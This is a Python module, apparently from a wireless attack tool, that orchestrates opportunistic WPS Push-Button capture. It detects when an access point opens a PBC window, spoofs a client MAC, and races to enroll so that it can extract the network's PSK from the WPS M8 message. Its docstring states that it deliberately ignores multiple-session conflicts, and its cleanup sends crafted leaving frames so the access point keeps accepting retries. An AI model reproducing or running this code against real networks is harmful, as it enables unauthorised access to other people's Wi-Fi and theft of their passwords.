"""WpsPbcCapture — live orchestrator for opportunistic WPS Push-Button capture.

Given an AP in (or entering) its PBC walk window, associate as an Enrollee and
run the WpsEnrollee exchange to extract the PSK from M8. This is the active piece
the Scanner/Focus arming wires to; detection itself is passive
(``AccessPoint.wps_pbc_active``).

Overlap policy: we do NOT self-abort on MULTIPLE_PBC_DETECTED — we race to finish
first (the decision locked in the README). WpsEnrollee surfaces such a refusal as
PROTO_ERROR, and the caller simply retries on the next window.
"""

from __future__ import annotations

import logging
from typing import Optional

from ..campaign import Campaign
from .association import (
    WPS_REQ_ENROLLEE, WlanTransport, WpsAssociation, build_client_leaving,
    random_client_mac, str_to_mac,
)
from .enrollee import WpsEnrollee
from .registrar import AttemptOutcome, PinResult

logger = logging.getLogger(__name__)


class PbcWatcher:
    """Edge-detects PBC walk windows opening across the live AP list.

    ``new_windows(aps)`` returns the APs whose ``wps_pbc_active`` just went
    False→True since the previous call, so callers act once per window rather
    than every poll tick. A window that closes and re-opens re-triggers.
    """

    def __init__(self):
        self._active: set = set()

    def new_windows(self, aps):
        current = {ap.bssid for ap in aps if getattr(ap, "wps_pbc_active", False)}
        opened = current - self._active
        self._active = current
        return [ap for ap in aps if ap.bssid in opened]


class WpsPbcCapture(Campaign):
    button_id = None        # no button — auto-triggered when a PBC window opens
    key = "pbc"
    stoppable = False

    def __init__(self, iface, target, our_mac: Optional[bytes] = None, log=None,
                 tx_observer=None):
        super().__init__(ap=target, iface=iface)
        self.target = target
        self.bssid = target.bssid.lower()
        self.channel = target.channel
        self.our_mac = our_mac or random_client_mac()
        self.log = log or logger.info
        self.tx_observer = tx_observer        # optional: record our TX (probe pcap)
        # Set by _loop for the screen to read once `done` — the captured outcome
        # (SUCCESS carries SSID + PSK), or the error if the attempt blew up.
        self.outcome: Optional[AttemptOutcome] = None
        self.error: Optional[Exception] = None

    async def _loop(self) -> None:
        """One PBC enrollment attempt. The screen reads ``outcome`` once ``done``.
        capture() self-cleans in its own finally, so teardown() is a no-op."""
        try:
            self.outcome = await self.capture()
        except Exception as exc:
            self.error = exc

    async def capture(self) -> AttemptOutcome:
        """One PBC enrollment attempt. Returns the WpsEnrollee outcome (SUCCESS
        carries the SSID + PSK)."""
        assoc = WpsAssociation(self.iface, self.bssid, self.target.ssid or "",
                               self.channel, our_mac=self.our_mac,
                               wps_request_type=WPS_REQ_ENROLLEE)
        assoc.start()
        armed = await self.iface.set_fake_mac(self.our_mac, str_to_mac(self.bssid))
        warning = self.iface.active_monitor_warning()
        if isinstance(warning, str):
            self.log(warning)
            self.log("[dim]Continuing anyway (expect failures/timeouts)[/dim]")
        transport = WlanTransport(self.iface, str_to_mac(self.bssid), self.our_mac,
                                  tx_observer=self.tx_observer, ack=armed is not None)
        transport.start()
        outcome = None
        try:
            if not await assoc.associate():
                self.log(f"assoc failed ({assoc.fail_reason}); running EAPOL anyway")
            outcome = await WpsEnrollee(transport, str_to_mac(self.bssid),
                                        self.our_mac, log=self.log).run()
        finally:
            # Abandoning a (possibly mid-exchange) attempt: tell the AP we're
            # leaving so it drops our EAP session. Otherwise it keeps retransmitting
            # the in-flight WSC message to this now-dead MAC and won't service the
            # next attempt's fresh MAC — the "stuck at Identity" lockout cascade.
            # Skipped on SUCCESS (the exchange already completed cleanly).
            if outcome is None or outcome.result is not PinResult.SUCCESS:
                try:
                    await self.iface.send_raw(
                        build_client_leaving(str_to_mac(self.bssid), self.our_mac))
                except Exception:
                    logger.debug("PBC leaving-deauth failed", exc_info=True)
            await self.iface.clear_fake_mac()
            transport.stop()
            assoc.stop()
        return outcome
